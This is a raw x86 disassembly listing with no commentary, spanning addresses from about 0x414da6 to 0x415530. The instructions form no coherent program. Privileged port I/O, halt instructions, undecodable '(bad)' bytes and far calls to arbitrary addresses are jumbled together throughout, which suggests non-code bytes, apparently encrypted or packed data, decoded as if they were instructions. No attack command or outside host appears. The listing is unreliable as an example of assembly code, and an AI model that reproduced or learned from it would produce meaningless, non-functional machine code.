  414da6:	dec    DWORD PTR [esp+ecx*2-0x28]
  414daa:	es mov edx,edx
  414dad:	popa   
  414dae:	ins    BYTE PTR es:[edi],dx
  414daf:	int3   
  414db0:	add    al,0x90
  414db2:	mov    ah,0x30
  414db4:	popf   
  414db5:	and    BYTE PTR [edx-0x6d],dh
  414db8:	mov    edx,0x9836eb0b
  414dbd:	pop    esp
  414dbe:	push   edx
  414dbf:	scas   eax,DWORD PTR es:[edi]
  414dc0:	imul   ebx,DWORD PTR [ecx],0xffffffa2
  414dc3:	mov    edi,0xb7be5375
  414dc8:	fcmovne st,st(4)
  414dca:	scas   al,BYTE PTR es:[edi]
  414dcb:	push   0x7d
  414dcd:	sti    
  414dce:	add    ebx,DWORD PTR [esi-0x60]
  414dd1:	inc    ebx
  414dd2:	lods   eax,DWORD PTR ds:[esi]
  414dd3:	inc    ebx
  414dd4:	and    edx,ebx
  414dd6:	rol    BYTE PTR gs:[edi+0x5a],cl
  414dda:	inc    ebx
  414ddb:	push   edi
  414ddc:	add    edi,edi
  414dde:	jne    0x414dcb
  414de0:	outs   dx,DWORD PTR ds:[esi]
  414de1:	pop    es
  414de2:	popf   
  414de3:	out    dx,eax
  414de4:	mov    esp,DWORD PTR [ebx]
  414de6:	inc    ebx
  414de7:	jl     0x414dad
  414de9:	scas   eax,DWORD PTR es:[edi]
  414dea:	adc    ebp,eax
  414dec:	popa   
  414ded:	lock xchg ebx,eax
  414def:	mov    ah,BYTE PTR [eax]
  414df1:	inc    edi
  414df2:	dec    BYTE PTR [ecx+0x660bc438]
  414df8:	xchg   esp,eax
  414df9:	call   0x95b4a9e4
  414dfe:	add    BYTE PTR [edx+0x17ef472e],0xcb
  414e05:	adc    al,0x50
  414e07:	mov    dl,0x73
  414e09:	cmp    bl,BYTE PTR [ebx+edx*8]
  414e0c:	inc    esp
  414e0d:	pop    edi
  414e0e:	pop    DWORD PTR [eax+eax*2]
  414e11:	xchg   BYTE PTR [ebx+0x19],al
  414e14:	in     eax,0xa0
  414e16:	sti    
  414e17:	or     bh,cl
  414e19:	retf   0xa83c
  414e1c:	sub    esi,esi
  414e1e:	je     0x414e6c
  414e20:	mov    ds:0x4f3927b4,eax
  414e25:	or     esp,DWORD PTR [esi-0x21e5635c]
  414e2b:	(bad)  
  414e2c:	retf   
  414e2d:	fcomp  QWORD PTR [edi-0x373b7e06]
  414e33:	ja     0x414e44
  414e35:	inc    ecx
  414e36:	shl    esp,0x18
  414e39:	test   BYTE PTR [ecx+edx*2-0x2c6af77],dl
  414e40:	pop    edx
  414e41:	retf   
  414e42:	inc    esi
  414e43:	loopne 0x414eac
  414e45:	inc    ebp
  414e46:	fwait
  414e47:	(bad)  
  414e48:	dec    eax
  414e49:	pop    ecx
  414e4a:	not    BYTE PTR [ebp+0x7d]
  414e4d:	jge    0x414eb3
  414e4f:	mov    cl,0x19
  414e51:	adc    al,0x79
  414e53:	sahf   
  414e54:	repnz push ebx
  414e56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e57:	pusha  
  414e58:	push   esi
  414e59:	sahf   
  414e5a:	nop
  414e5b:	pop    es
  414e5c:	inc    edx
  414e5d:	or     eax,0x4188af2e
  414e62:	not    dl
  414e64:	pushf  
  414e65:	fwait
  414e66:	imul   edx,DWORD PTR [esi],0x11
  414e69:	shr    edx,cl
  414e6b:	mov    cl,0xb2
  414e6d:	sbb    eax,0xbe3ef4e3
  414e72:	mov    al,0xdf
  414e74:	stc    
  414e75:	int    0xe4
  414e77:	(bad)  
  414e78:	in     eax,0x54
  414e7a:	push   0xffffffe3
  414e7c:	repz mov ecx,0xe2dffe01
  414e82:	cld    
  414e83:	jp     0x414efa
  414e85:	or     bh,al
  414e87:	in     eax,0x27
  414e89:	jp     0x414e3e
  414e8b:	hlt    
  414e8c:	jecxz  0x414ee0
  414e8e:	(bad)  
  414e8f:	arpl   WORD PTR ds:0xb7faaab,sp
  414e95:	push   ds
  414e96:	cdq    
  414e97:	mov    sp,0x7195
  414e9b:	fwait
  414e9c:	ret    
  414e9d:	jne    0x414e62
  414e9f:	push   es
  414ea0:	fild   DWORD PTR [edi-0x75]
  414ea3:	sbb    eax,0x24814f5
  414ea8:	test   BYTE PTR [edi+ebx*8],dl
  414eab:	ret    0xe414
  414eae:	popa   
  414eaf:	and    cl,BYTE PTR [ecx]
  414eb1:	sbb    ch,BYTE PTR [edi-0x22]
  414eb4:	out    dx,al
  414eb5:	mov    esp,0x11131c27
  414eba:	xlat   BYTE PTR ds:[ebx]
  414ebb:	mov    ds:0x6b2ec9e7,al
  414ec0:	push   0x686b4fbd
  414ec5:	inc    esi
  414ec6:	xor    DWORD PTR ds:0xd197e903,0x1d6507ae
  414ed0:	jecxz  0x414e63
  414ed2:	inc    cl
  414ed4:	mov    bh,0x5
  414ed6:	hlt    
  414ed7:	jne    0x414ea4
  414ed9:	push   0xbcb62f07
  414ede:	pop    ebp
  414edf:	xchg   edi,eax
  414ee0:	dec    eax
  414ee1:	fldenv [eax+0x34]
  414ee4:	jae    0x414f44
  414ee6:	jge    0x414ecd
  414ee8:	pop    edi
  414ee9:	jmp    0x414ea0
  414eeb:	pusha  
  414eec:	sub    ch,BYTE PTR [esi]
  414eee:	fcompp 
  414ef0:	jo     0x414f02
  414ef2:	and    eax,0x977b8c73
  414ef7:	stc    
  414ef8:	xchg   ecx,eax
  414ef9:	loope  0x414f49
  414efb:	pop    esi
  414efc:	scas   al,BYTE PTR es:[edi]
  414efd:	push   ss
  414efe:	div    bl
  414f00:	dec    ebp
  414f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f02:	outs   dx,DWORD PTR ds:[esi]
  414f03:	mov    bl,0xc6
  414f05:	dec    edx
  414f06:	dec    edx
  414f07:	push   ss
  414f08:	mov    dl,ah
  414f0a:	mov    ebp,esp
  414f0c:	out    0x6e,eax
  414f0e:	push   ss
  414f0f:	pop    ds
  414f10:	(bad)  
  414f11:	iret   
  414f12:	arpl   di,cx
  414f14:	cmp    eax,0xb52009f
  414f19:	data16 jo 0x414f77
  414f1c:	div    BYTE PTR [ecx]
  414f1e:	xchg   ebx,eax
  414f1f:	fisttp WORD PTR [ebx]
  414f21:	mov    DWORD PTR [edx],ecx
  414f23:	mov    esi,0x6a4a9236
  414f28:	bound  edx,QWORD PTR [ebx-0x55e046cc]
  414f2e:	xchg   edx,eax
  414f2f:	and    BYTE PTR [eax+0x69e27367],ch
  414f35:	jo     0x414efc
  414f37:	test   eax,0x2e6ffe31
  414f3c:	fld    TBYTE PTR [ecx]
  414f3e:	jp     0x414ec4
  414f40:	jle    0x414f87
  414f42:	or     BYTE PTR [ebx-0x3d],0xed
  414f46:	sub    BYTE PTR [ebx-0x5ec3040d],cl
  414f4c:	imul   ebp,DWORD PTR [edx],0x4e43a2b9
  414f52:	pushf  
  414f53:	lods   al,BYTE PTR ds:[esi]
  414f54:	addr16 push ecx
  414f56:	xor    BYTE PTR [ebp+0x727d120f],0x23
  414f5d:	aam    0x75
  414f5f:	dec    esp
  414f60:	test   dh,0x76
  414f63:	imul   edi,DWORD PTR [ebp+0x66],0xffffff81
  414f67:	mov    WORD PTR [esi-0x27],ds
  414f6a:	cmc    
  414f6b:	scas   al,BYTE PTR es:[edi]
  414f6c:	sbb    edi,DWORD PTR [edi-0x770442a4]
  414f72:	jne    0x414fec
  414f74:	aad    0x5f
  414f76:	pop    esi
  414f77:	mov    BYTE PTR es:[ebp-0x53eafa81],cl
  414f7e:	pop    esp
  414f7f:	sti    
  414f80:	int    0x7e
  414f82:	cmp    BYTE PTR [ebx],cl
  414f84:	or     bl,BYTE PTR [edi-0x180eb3b2]
  414f8a:	or     BYTE PTR [edx-0x5f6c23dd],al
  414f90:	ds pop edi
  414f92:	mov    WORD PTR [edi-0x7f],fs
  414f95:	jo     0x414f49
  414f97:	sub    DWORD PTR [edi-0x1b],edi
  414f9a:	cmp    eax,0xff77ff55
  414f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fa0:	test   ebx,0x78390bcf
  414fa6:	sub    DWORD PTR [ebp+eax*8-0x7f533a9d],esi
  414fad:	test   BYTE PTR ds:0xa5b329d1,cl
  414fb3:	popf   
  414fb4:	fidiv  WORD PTR [esi-0x70]
  414fb7:	iret   
  414fb8:	sbb    DWORD PTR ds:[edx],0xffffff9b
  414fbc:	add    al,0x81
  414fbe:	xor    BYTE PTR ds:0xb310033b,bl
  414fc4:	repz push ss
  414fc6:	sub    ebp,DWORD PTR [ecx-0xf]
  414fc9:	and    BYTE PTR [ebp-0x36],cl
  414fcc:	mov    eax,0xc1668ce9
  414fd1:	pop    esp
  414fd2:	pop    esi
  414fd3:	jae    0x414fa5
  414fd5:	lock sbb DWORD PTR [ebx],ebp
  414fd8:	inc    edi
  414fd9:	bound  ebp,QWORD PTR [ebx+0xc]
  414fdc:	ret    0xca55
  414fdf:	jmp    0x7a279af7
  414fe4:	adc    BYTE PTR [ebx-0x6dec532f],dl
  414fea:	aaa    
  414feb:	rcr    dh,cl
  414fed:	push   0x9cda089e
  414ff2:	jne    0x415045
  414ff4:	lods   eax,DWORD PTR ds:[esi]
  414ff5:	xchg   esp,eax
  414ff6:	aas    
  414ff7:	pop    ds
  414ff8:	push   0x60cd709d
  414ffd:	imul   ebp,DWORD PTR [esi-0x4d],0x78
  415001:	nop
  415002:	sbb    BYTE PTR [eax-0x76],bh
  415005:	ss in  eax,dx
  415007:	and    al,0xc2
  415009:	jl     0x414fa8
  41500b:	xchg   ebx,eax
  41500c:	ja     0x414feb
  41500e:	stos   DWORD PTR es:[edi],eax
  41500f:	inc    ebx
  415010:	jo     0x415080
  415012:	and    ecx,ecx
  415014:	pop    si
  415016:	push   0x5a1b1a1e
  41501b:	inc    esp
  41501c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41501d:	test   DWORD PTR [ecx-0x67],eax
  415020:	mov    eax,0x3038b3b4
  415025:	xlat   BYTE PTR ds:[ebx]
  415026:	arpl   WORD PTR [edi+eax*4-0x667a5050],bx
  41502d:	cmp    dl,BYTE PTR [eax+eiz*1+0x5c]
  415031:	pop    eax
  415032:	stc    
  415033:	dec    esp
  415034:	pop    ebp
  415035:	pushf  
  415036:	lods   eax,DWORD PTR ds:[esi]
  415037:	outs   dx,DWORD PTR ds:[esi]
  415038:	dec    ebx
  415039:	fs pop esi
  41503b:	push   ecx
  41503c:	pop    ss
  41503d:	(bad)  
  41503e:	adc    dh,BYTE PTR [esi]
  415040:	pop    ds
  415041:	push   edx
  415042:	dec    ebx
  415043:	jmp    FWORD PTR [ebp+0x36]
  415046:	std    
  415047:	stos   BYTE PTR es:[edi],al
  415048:	mov    eax,0x7292474a
  41504d:	mov    esp,0xf2ca5f0c
  415052:	xchg   edx,eax
  415053:	pop    ebp
  415054:	inc    ebx
  415055:	push   ds
  415056:	push   cs
  415057:	gs dec ebp
  415059:	leave  
  41505a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41505b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41505c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41505d:	fcom   DWORD PTR [ebx+0x41]
  415060:	inc    esp
  415061:	inc    esi
  415062:	push   edi
  415063:	jns    0x4150a0
  415065:	or     dh,BYTE PTR [esi]
  415067:	mov    dh,0xfe
  415069:	retf   
  41506a:	xor    edx,esp
  41506c:	idiv   DWORD PTR [esp+edx*8-0x77]
  415070:	mov    dh,0xcf
  415072:	and    eax,0x570fefb0
  415077:	test   BYTE PTR [eax],0x45
  41507a:	xrstors [eax]
  41507d:	fs inc edi
  41507f:	or     esi,eax
  415081:	adc    BYTE PTR [esi-0x69],dl
  415084:	jl     0x41509b
  415086:	sub    DWORD PTR [edx],ebx
  415088:	dec    ecx
  415089:	stc    
  41508a:	push   ecx
  41508b:	imul   esi,DWORD PTR [eax-0x7cfc4f9c],0x40
  415092:	jmp    0xdd6881f5
  415097:	xchg   esp,eax
  415098:	jmp    0xc2e3bae2
  41509d:	dec    edx
  41509e:	ja     0x415020
  4150a0:	mov    fs,edx
  4150a2:	hlt    
  4150a3:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4150a5:	dec    edi
  4150a6:	setnp  BYTE PTR ss:[esi]
  4150aa:	and    edi,esi
  4150ac:	push   0x340fc17
  4150b1:	mov    edi,0x2bf5767
  4150b6:	cmp    esp,DWORD PTR [edi]
  4150b8:	dec    eax
  4150b9:	test   DWORD PTR ds:0x5a346cb8,ebp
  4150bf:	retf   0xc906
  4150c2:	jno    0x415117
  4150c4:	jne    0x4150fe
  4150c6:	adc    al,0x67
  4150c8:	and    DWORD PTR [ecx-0xc32691c],eax
  4150ce:	cmp    DWORD PTR [ebx-0x5bb2944f],0x27
  4150d5:	fild   WORD PTR [ecx-0x4b]
  4150d8:	sub    BYTE PTR [edi+0xeb30e83],bl
  4150de:	std    
  4150df:	push   ds
  4150e0:	add    al,0xfe
  4150e2:	adc    al,0xde
  4150e4:	sbb    esp,DWORD PTR [edx]
  4150e6:	add    eax,0x592df3b5
  4150eb:	inc    ecx
  4150ec:	bound  ecx,QWORD PTR [ecx]
  4150ee:	jae    0x4150ab
  4150f0:	push   ds
  4150f1:	pop    ds
  4150f2:	arpl   bp,di
  4150f4:	out    dx,eax
  4150f5:	inc    ecx
  4150f6:	mov    eax,0x46c71ebb
  4150fb:	(bad)  
  4150fd:	int3   
  4150fe:	cwde   
  4150ff:	cmp    ebp,DWORD PTR [ebp-0x6291eb89]
  415105:	xor    BYTE PTR [ebx-0x17],0x17
  415109:	outs   dx,DWORD PTR ds:[esi]
  41510a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41510b:	sbb    al,BYTE PTR [edi+ebp*8]
  41510e:	sahf   
  41510f:	rol    ah,cl
  415111:	outs   dx,DWORD PTR ds:[esi]
  415112:	mov    dh,0xa3
  415114:	dec    esi
  415115:	imul   edx,DWORD PTR [edi*1-0xc5fd16d],0xffffff80
  41511d:	dec    ebp
  41511e:	dec    ecx
  41511f:	xor    dl,BYTE PTR [esi+0x64]
  415122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415123:	shl    BYTE PTR ds:0xf62591c9,cl
  415129:	leave  
  41512a:	or     DWORD PTR [eax+edi*2-0x25],ecx
  41512e:	mov    ds:0x15660d7,al
  415133:	(bad)  
  415134:	lods   al,BYTE PTR ds:[esi]
  415135:	(bad)  
  415136:	jae    0x4150f7
  415138:	outs   dx,DWORD PTR ds:[esi]
  415139:	or     BYTE PTR [ebx-0x65],0x6d
  41513d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41513e:	mov    eax,0x4861c307
  415143:	scas   eax,DWORD PTR es:[edi]
  415144:	jnp    0x415153
  415146:	int    0x15
  415148:	push   eax
  415149:	dec    ebp
  41514a:	cld    
  41514b:	cmp    eax,DWORD PTR [edi+eax*8]
  41514e:	retf   0xf9fa
  415151:	xor    DWORD PTR [edx-0x2e],0x9e17e982
  415158:	adc    bl,BYTE PTR [di]
  41515b:	push   ss
  41515c:	add    DWORD PTR [ebx],ebx
  41515e:	iret   
  41515f:	fisttp WORD PTR [edi+ecx*1-0x48555eb4]
  415166:	sbb    eax,0x48a29eff
  41516b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41516c:	cmc    
  41516d:	cmp    bl,BYTE PTR [ecx-0x74]
  415170:	mov    bl,0x98
  415172:	dec    edi
  415173:	(bad)  [ecx]
  415175:	loopne 0x4151d5
  415177:	jno    0x41517b
  415179:	pusha  
  41517a:	js     0x415198
  41517c:	aas    
  41517d:	(bad)  [esi]
  41517f:	or     al,dh
  415181:	es scas al,BYTE PTR es:[edi]
  415183:	fdivr  st(7),st
  415185:	pop    eax
  415186:	cwde   
  415187:	xor    al,0x9f
  415189:	mov    bh,0x71
  41518b:	xchg   ch,cl
  41518d:	sbb    DWORD PTR [ebx+edi*2+0x6b],ebp
  415191:	sti    
  415192:	pop    ebx
  415193:	jns    0x415118
  415195:	mov    WORD PTR [edx+0x4652c70e],es
  41519b:	add    BYTE PTR [edi+0x9fdee94],dh
  4151a1:	cmp    ecx,DWORD PTR [eax]
  4151a3:	(bad)  
  4151a4:	cwde   
  4151a5:	bound  eax,QWORD PTR [ebp-0xde6d988]
  4151ab:	out    0x13,al
  4151ad:	daa    
  4151ae:	cs (bad) 
  4151b0:	out    dx,al
  4151b1:	jle    0x4151b9
  4151b3:	push   eax
  4151b4:	fdiv   DWORD PTR [ecx-0x77]
  4151b7:	cdq    
  4151b8:	mov    al,0xa3
  4151ba:	xchg   esi,eax
  4151bb:	xlat   BYTE PTR ds:[ebx]
  4151bc:	pop    ds
  4151bd:	sbb    dh,dl
  4151bf:	or     ax,0x923a
  4151c3:	jecxz  0x41520a
  4151c5:	loopne 0x415208
  4151c7:	aas    
  4151c8:	fwait
  4151c9:	test   BYTE PTR [esi+edx*8-0x4e],bl
  4151cd:	fwait
  4151ce:	loopne 0x4151f4
  4151d0:	retf   0x5dc5
  4151d3:	dec    ebp
  4151d4:	call   0x7d0d:0x178d75fb
  4151db:	sub    edx,edi
  4151dd:	popf   
  4151de:	add    ah,BYTE PTR [ebx]
  4151e0:	mov    esp,0x51f98ec6
  4151e5:	mov    dl,0x14
  4151e7:	mov    gs,WORD PTR [edx+eax*8]
  4151ea:	push   esi
  4151eb:	nop
  4151ec:	fisttp DWORD PTR [eax+edi*2+0x53]
  4151f0:	in     al,dx
  4151f1:	add    BYTE PTR [edi],0xfe
  4151f4:	mov    ebp,0x926dc352
  4151f9:	popf   
  4151fa:	adc    eax,0xc1b983f4
  4151ff:	sub    DWORD PTR [ebx+esi*8-0x63d70577],0x8
  415207:	mov    ds:0xf45b49fb,ax
  41520d:	mov    DWORD PTR [ebx-0x49],edi
  415210:	fiadd  DWORD PTR [ebx-0x23]
  415213:	aam    0x49
  415215:	xchg   BYTE PTR [eax+eiz*2-0x4bc3b682],ah
  41521c:	mov    bh,0x3b
  41521e:	push   eax
  41521f:	outs   dx,BYTE PTR ds:[esi]
  415220:	stos   BYTE PTR es:[edi],al
  415221:	dec    ecx
  415222:	cmp    eax,DWORD PTR [edx-0x60d096e7]
  415228:	iret   
  415229:	jmp    0x41522a
  41522b:	mul    DWORD PTR [ebp+0x4e3d4341]
  415231:	cmp    esi,DWORD PTR [ecx-0x4d5fe037]
  415237:	retf   0xf23e
  41523a:	jne    0x4151cf
  41523c:	je     0x415241
  41523e:	adc    eax,0x7fc2ec5a
  415243:	aaa    
  415244:	sub    bh,BYTE PTR [eax-0x72]
  415247:	in     eax,0x74
  415249:	or     eax,0x96075cf9
  41524e:	add    ch,cl
  415250:	sti    
  415251:	cmp    al,0xaa
  415253:	xor    ebp,DWORD PTR [ebx+ecx*1-0x17]
  415257:	je     0x4152a3
  415259:	fs out 0x9b,al
  41525c:	cmp    eax,0xa06035
  415261:	sbb    ah,BYTE PTR [edx+0x6d]
  415264:	sub    BYTE PTR [edx+0x640a42fa],ch
  41526a:	ins    BYTE PTR es:[edi],dx
  41526b:	sbb    edi,DWORD PTR [esi+0x16]
  41526e:	ja     0x415249
  415270:	rcr    BYTE PTR [esi+0x73104514],1
  415276:	cmp    cl,BYTE PTR [ecx-0x4ee86bca]
  41527c:	push   0x1d17a3ad
  415281:	jmp    0x3150db4e
  415286:	mov    ch,0x83
  415288:	mov    esp,0x889d210a
  41528d:	data16 shl dl,0x3e
  415291:	push   0x3e828f04
  415296:	cmp    al,0xa4
  415298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415299:	stc    
  41529a:	ror    DWORD PTR [ebx+0x1faf759e],cl
  4152a0:	and    al,0x14
  4152a2:	pop    edx
  4152a3:	push   esi
  4152a4:	mov    eax,0x3459ba0f
  4152a9:	outs   dx,DWORD PTR ds:[esi]
  4152aa:	dec    eax
  4152ab:	jle    0x415303
  4152ad:	ror    BYTE PTR [ecx+0x3],1
  4152b0:	mov    ds:0x34f3635f,eax
  4152b5:	outs   dx,BYTE PTR ds:[esi]
  4152b6:	sbb    al,0xdb
  4152b8:	cmp    eax,0xb0e4f3c8
  4152bd:	hlt    
  4152be:	push   edi
  4152bf:	sub    ah,BYTE PTR [esi+0x1e]
  4152c2:	push   ss
  4152c3:	xchg   edi,eax
  4152c4:	loop   0x4152b0
  4152c6:	icebp  
  4152c7:	outs   dx,BYTE PTR ds:[esi]
  4152c8:	sahf   
  4152c9:	cli    
  4152ca:	mov    ch,0xa2
  4152cc:	push   es
  4152cd:	cmp    ebx,ebp
  4152cf:	push   ds
  4152d0:	(bad)  
  4152d1:	inc    eax
  4152d2:	inc    edi
  4152d3:	xor    eax,0xfaf63bf8
  4152d8:	xchg   ecx,eax
  4152d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152da:	aad    0xc1
  4152dc:	inc    ebp
  4152dd:	std    
  4152de:	sbb    eax,0x31cb8910
  4152e3:	and    eax,0x2f2bacc6
  4152e8:	gs or  bh,ch
  4152eb:	dec    ecx
  4152ec:	aaa    
  4152ed:	cmp    DWORD PTR [esi],ebp
  4152ef:	dec    ecx
  4152f0:	clc    
  4152f1:	pushf  
  4152f2:	add    dl,BYTE PTR [eax+edx*1]
  4152f5:	into   
  4152f6:	xor    dh,ch
  4152f8:	lods   al,BYTE PTR ds:[esi]
  4152f9:	or     ecx,esp
  4152fb:	icebp  
  4152fc:	xchg   DWORD PTR [ebx-0x24],edx
  4152ff:	cmp    al,0x2
  415301:	adc    al,0x51
  415303:	jp     0x41535e
  415305:	inc    ebp
  415306:	dec    ecx
  415307:	stc    
  415308:	cld    
  415309:	xchg   edx,eax
  41530a:	pop    edx
  41530b:	sbb    al,0x86
  41530e:	pop    bx
  415310:	fdiv   QWORD PTR [ebx]
  415312:	lock mov edx,0x74c58067
  415318:	retf   
  415319:	adc    esi,DWORD PTR [ecx+0x16d3e392]
  41531f:	sub    dl,BYTE PTR [edx+ecx*1+0x59bbfb21]
  415326:	in     eax,0x33
  415328:	push   0xffffffe4
  41532a:	or     al,0xd2
  41532c:	fwait
  41532d:	xchg   edi,eax
  41532e:	inc    edx
  41532f:	enter  0x718,0xd6
  415333:	pop    edx
  415334:	or     al,0x32
  415336:	shl    BYTE PTR [esi+ecx*1],cl
  415339:	cs pop edi
  41533b:	pushf  
  41533c:	mov    WORD PTR [esi-0x7f],ss
  41533f:	inc    esi
  415340:	push   edx
  415341:	out    0xe5,eax
  415343:	imul   eax,DWORD PTR [ecx-0x1f],0x79ef276d
  41534a:	fidiv  WORD PTR [edi-0x2cd761af]
  415350:	mov    ds:0xd852a6f7,al
  415355:	sbb    cl,BYTE PTR [esi+0x265b1978]
  41535b:	add    al,0x40
  41535d:	pop    ecx
  41535e:	sbb    eax,DWORD PTR [edx+0xfb01b05]
  415364:	jp     0x4153c3
  415366:	mov    al,ds:0xee7a46f6
  41536b:	add    DWORD PTR [esi+eax*4],ecx
  41536e:	and    DWORD PTR ds:[ebx-0x77d012b4],esp
  415375:	and    eax,0xe66c44ad
  41537a:	call   0x896b:0xe120ff2b
  415381:	mov    dl,0x95
  415383:	ficomp DWORD PTR [eax-0x3843182]
  415389:	dec    edi
  41538a:	jp     0x41530d
  41538c:	jo     0x41532b
  41538e:	xchg   esp,eax
  41538f:	adc    eax,0xbf9071e
  415394:	cmp    DWORD PTR [bp+si],eax
  415397:	sbb    esp,DWORD PTR [esp+esi*8]
  41539a:	loop   0x41531d
  41539c:	and    al,0xbf
  41539e:	lea    ebp,[esi+0x5d]
  4153a1:	pusha  
  4153a2:	jns    0x41533b
  4153a4:	cs aad 0xc3
  4153a7:	cs pop esi
  4153a9:	or     al,0xec
  4153ab:	idiv   DWORD PTR [edx]
  4153ad:	(bad)  [ebp+0x5b]
  4153b0:	push   cs
  4153b1:	add    dl,BYTE PTR [eax-0x1e07ef31]
  4153b7:	sbb    DWORD PTR [edi+0xba84ef6],edi
  4153bd:	pusha  
  4153be:	(bad)  
  4153bf:	into   
  4153c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153c1:	xchg   edx,eax
  4153c2:	jecxz  0x41540b
  4153c4:	xlat   BYTE PTR ds:[ebx]
  4153c5:	repz or eax,0xca6683ef
  4153cb:	mov    fs,WORD PTR [esi+0x3da2f0c8]
  4153d1:	out    0x5,al
  4153d3:	push   edx
  4153d5:	or     dh,bh
  4153d7:	ins    BYTE PTR es:[edi],dx
  4153d8:	shl    BYTE PTR [edx-0x7cae6188],1
  4153de:	xor    BYTE PTR ds:0xb20c1678,dl
  4153e4:	add    ebx,esi
  4153e6:	dec    ecx
  4153e7:	(bad)  
  4153e9:	out    dx,eax
  4153ea:	es popa 
  4153ec:	xchg   esi,eax
  4153ed:	inc    ecx
  4153ee:	pop    esp
  4153ef:	pop    ebp
  4153f0:	mov    bl,0xe1
  4153f2:	xchg   esi,eax
  4153f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153f4:	and    bl,bh
  4153f6:	test   edx,ebx
  4153f8:	fcmovbe st,st(0)
  4153fa:	popf   
  4153fb:	xchg   edx,eax
  4153fc:	loop   0x415479
  4153fe:	dec    ebp
  4153ff:	inc    ebx
  415400:	stos   DWORD PTR es:[edi],eax
  415401:	jbe    0x4153b3
  415403:	xchg   DWORD PTR [ecx-0x76],esi
  415406:	push   esi
  415407:	pop    esp
  415408:	add    eax,0x5d3b8db6
  41540d:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41540f:	sub    esi,eax
  415411:	mov    eax,0xb7e57e66
  415416:	(bad)  
  415417:	xor    ah,BYTE PTR [ebp+0x3a]
  41541a:	pop    esi
  41541b:	in     al,dx
  41541c:	and    esi,DWORD PTR [edi]
  41541e:	stc    
  41541f:	and    BYTE PTR [esi-0xb],0x89
  415423:	arpl   WORD PTR [ecx-0x6e],di
  415426:	das    
  415427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415428:	cld    
  415429:	out    dx,eax
  41542a:	mov    ds:0x9f5f69ea,al
  41542f:	cmp    eax,0xd73c0c29
  415434:	sub    eax,0xc1d70efd
  415439:	mov    WORD PTR [edx-0x6c],ds
  41543c:	(bad)  
  41543d:	jl     0x4154a5
  41543f:	call   0x6a73:0x3c08741b
  415446:	pop    edi
  415447:	in     eax,dx
  415448:	mov    ecx,0x4f9f99cc
  41544d:	out    0x61,al
  41544f:	xor    edi,DWORD PTR [ebp+0x22]
  415452:	imul   esp,eax,0xffffff84
  415455:	xor    DWORD PTR [esi+0x2],0x64944cc4
  41545c:	shl    BYTE PTR [ecx],1
  41545e:	mov    al,ds:0x9ca35e1
  415463:	inc    eax
  415464:	and    eax,0x9da4dedd
  415469:	dec    edx
  41546a:	push   ecx
  41546b:	test   DWORD PTR [ebx],ebp
  41546d:	mov    ecx,0x966a2e9d
  415472:	adc    BYTE PTR [eax+0x38],0xb9
  415476:	loop   0x41547f
  415478:	gs out dx,eax
  41547a:	inc    esp
  41547b:	push   eax
  41547c:	mov    dl,0xc1
  41547e:	dec    ecx
  41547f:	sbb    eax,DWORD PTR [edx]
  415481:	lea    edi,[ebx-0x3]
  415484:	mov    cl,0xf7
  415486:	aad    0xd9
  415488:	imul   esp,DWORD PTR [eax-0x40d426ea],0x14a48b51
  415492:	inc    ebp
  415493:	add    eax,0x304e8b63
  415498:	test   al,0x1a
  41549a:	jbe    0x41543c
  41549c:	iret   
  41549d:	and    BYTE PTR [ebx+0x64],0xfc
  4154a1:	cld    
  4154a2:	pop    edx
  4154a3:	push   0x61
  4154a5:	add    dh,0xbb
  4154a8:	adc    BYTE PTR [edx],cl
  4154aa:	jmp    0x4154d0
  4154ac:	sti    
  4154ad:	addr16 mov esp,0x7e961990
  4154b3:	idiv   DWORD PTR [eax]
  4154b5:	and    eax,0x875419ef
  4154ba:	mov    cl,0x27
  4154bc:	(bad)  
  4154bd:	adc    al,0xe9
  4154bf:	sbb    al,ah
  4154c1:	jbe    0x415533
  4154c3:	test   BYTE PTR [edx],bh
  4154c5:	ficom  WORD PTR [ebp-0x4e]
  4154c8:	retf   0xe759
  4154cb:	push   edi
  4154cc:	ror    DWORD PTR [eax+0x62],0x4f
  4154d0:	and    eax,0x328b7a5c
  4154d5:	pusha  
  4154d6:	sbb    eax,DWORD PTR [eax+edi*4]
  4154d9:	push   eax
  4154da:	push   ds
  4154db:	mov    dh,cl
  4154dd:	outs   dx,BYTE PTR ds:[esi]
  4154de:	scas   eax,DWORD PTR es:[edi]
  4154df:	rcl    ch,0x94
  4154e2:	xchg   BYTE PTR [eax+0x62],dh
  4154e5:	ret    0x1f
  4154e8:	jecxz  0x41555c
  4154ea:	retf   0x9633
  4154ed:	cmp    BYTE PTR [ebx-0x2c],dh
  4154f0:	jnp    0x41552f
  4154f2:	dec    eax
  4154f3:	inc    esp
  4154f4:	xchg   ebx,eax
  4154f5:	call   0xee8f:0x15328469
  4154fc:	mov    dl,BYTE PTR [ecx]
  4154fe:	pop    esi
  4154ff:	out    dx,al
  415500:	cmp    eax,0x26c2f6a8
  415505:	push   es
  415506:	mov    ds:0xaa1b5a95,al
  41550b:	adc    eax,0x3c10367a
  415510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415511:	adc    ebx,ebp
  415513:	push   0x4
  415515:	out    0x6f,eax
  415517:	jno    0x41558f
  415519:	mov    eax,0x6f4f513d
  41551e:	addr16 jb 0x415505
  415521:	xor    al,0x11
  415523:	test   DWORD PTR [edx],0x85b62e74
  415529:	sub    BYTE PTR [ebp+0x39],cl
  41552c:	mov    DWORD PTR cs:[edi-0x12],eax
  415530:	sbb    DWORD PTR [esp+ebp*4],0xffffff89
